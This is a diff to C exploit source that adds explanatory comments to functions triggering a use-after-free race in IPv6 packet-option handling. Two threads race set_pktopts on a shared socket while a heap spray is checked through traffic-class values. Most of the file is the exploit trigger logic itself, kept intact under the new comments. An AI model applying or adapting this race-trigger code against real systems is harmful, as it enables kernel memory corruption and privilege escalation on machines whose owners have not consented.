@@ -88,28 +88,38 @@ int get_pktinfo(int s, char *buf) {
 // and returns it's descriptor.
 int new_socket() { return socket(AF_INET6, SOCK_DGRAM, 0); }
 
-// TODO: Add comment to this function
+// (Unsure) Function uses an already opened thread
 void *use_thread(void *arg) {
+    // Create a new opaque struct instance using the function
+    // argument <arg>.
     struct opaque *o = (struct opaque *)arg;
+
     // Create a buffer to hold control messages with enough space for an integer
     char buf[CMSG_SPACE(sizeof(int))];
+
     // Create a control message structure for IPv6 traffic class information.
     // This structure will be used to specify that we are working with the IPv6 protocol
     // and need to manipulate the traffic class (TCLASS) as ancillary data.
     struct cmsghdr *cmsg = (struct cmsghdr *)buf;
     cmsg->cmsg_len = CMSG_LEN(sizeof(int)); // Set the length of the control message to include an integer
-    cmsg->cmsg_level = IPPROTO_IPV6;          // Set the protocol level to IPPROTO_IPV6 (IPv6 protocol)
-    cmsg->cmsg_type = IPV6_TCLASS;           // Set the control message type to IPV6_TCLASS (IPv6 traffic class type)
+    cmsg->cmsg_level = IPPROTO_IPV6;        // Set the protocol level to IPPROTO_IPV6 (IPv6 protocol)
+    cmsg->cmsg_type = IPV6_TCLASS;          // Set the control message type to IPV6_TCLASS (IPv6 traffic class type)
+
     // Given a pointer to the control message header "cmsg," set its data field to 0
     *(int *)CMSG_DATA(cmsg) = 0;
-    while (!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY)
+
+    // TODO: comment this part
+    while (!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY) {
         if (set_pktopts(o->master_sock, buf, sizeof(buf)))
             *(volatile int *)0;
+    }
 
+    // Set the <triggered> and <done1> members of the opaque
+    // struct instace to (1) or (true)
     o->triggered = o->done1 = 1;
 }
 
-// (Unsure) Function free's a opened thread
+// (Unsure) Function used to free/close an already opened thread
 void *free_thread(void *arg) {
     // Create a new opaque struct instance using the function
     // argument <arg>.
@@ -123,7 +133,7 @@ void *free_thread(void *arg) {
         // Suspend process execution (100 us)
         nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL);
     }
-    
+
     // Set the <triggered> and <done2> members of the opaque
     // struct instace to (1) or (true)
     o->triggered = o->done2 = 1;
@@ -131,15 +141,15 @@ void *free_thread(void *arg) {
 
 // Triggers a Use-After-Free bug
 void trigger_uaf(struct opaque *o) {
-     int qqq[256];
+    int qqq[256];
     // Initialize the members of the opaque struct to 0
     o->triggered = o->padding = o->done1 = o->done2 = 0;
-    
+
     // Create a new thread to execute the use_thread function using <o> 
     // as the function argument, then the ID of created thread will be
     // stored inside of the <qqq>
     pthread_create(qqq, NULL, use_thread, o);
-    
+
     // Create a new thread to execute the free_thread function using <o> 
     // as the function argument, then the ID of created thread will be
     // stored inside of the <qqq> after the first 128 bytes
@@ -156,10 +166,10 @@ void trigger_uaf(struct opaque *o) {
                 *(volatile int *)0;
         nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
     }
-    
+
     printf_("uaf: %d\n", get_tclass(o->master_sock) - TCLASS_SPRAY);
     o->triggered = 1;
-    
+
     while (!o->done1 || !o->done2);
 }
 
